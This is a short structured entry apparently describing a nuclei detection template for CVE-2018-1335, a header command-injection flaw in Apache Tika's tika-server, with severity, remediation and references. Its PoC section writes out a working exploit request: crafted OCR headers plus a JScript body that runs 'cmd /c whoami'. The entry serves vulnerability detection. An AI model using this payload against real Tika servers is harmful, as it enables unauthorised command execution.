---
cve_id: CVE-2018-1335
template_path: nuclei-templates/http/cves/2018/CVE-2018-1335.yaml
affected_product: Apache Tika
severity: high
authentication: none
external_callback: false
affected_versions: 1.7 to 1.17
preconditions: [running tika-server, exposed to untrusted clients]
poc_classification: rce
---

## Vulnerability
Apache Tika versions 1.7 to 1.17 allow clients to send carefully crafted headers to tika-server that inject commands into the server command line. This affects only tika-server instances open to untrusted clients. Successful exploitation enables remote arbitrary command execution on the server.  
CVSS 3.0: 8.1 (AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H).  
Remediation: Upgrade to Tika 1.18.

## PoC / Detection
Classification: rce  
The template performs a single PUT request to `{{BaseURL}}/meta` with body `var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec("cmd /c whoami");` and headers `X-Tika-OCRTesseractPath: cscript`, `X-Tika-OCRLanguage: //E:Jscript`, `Content-type: image/jp2`, `Expect: 100-continue`. Detection matches on status 200, header containing `Content-Type: text/csv`, and body containing both `org.apache.tika.parser.DefaultParser` and `org.apache.tika.parser.gdal.GDALParse`.

## References
- https://rhinosecuritylabs.com/application-security/exploiting-cve-2018-1335-apache-tika/
- https://www.exploit-db.com/exploits/47208
- https://lists.apache.org/thread.html/b3ed4432380af767effd4c6f27665cc7b2686acccbefeb9f55851dca@%3Cdev.tika.apache.org%3E
- https://nvd.nist.gov/vuln/detail/CVE-2018-1335
- http://packetstormsecurity.com/files/153864/Apache-Tika-1.17-Header-Command-Injection.html
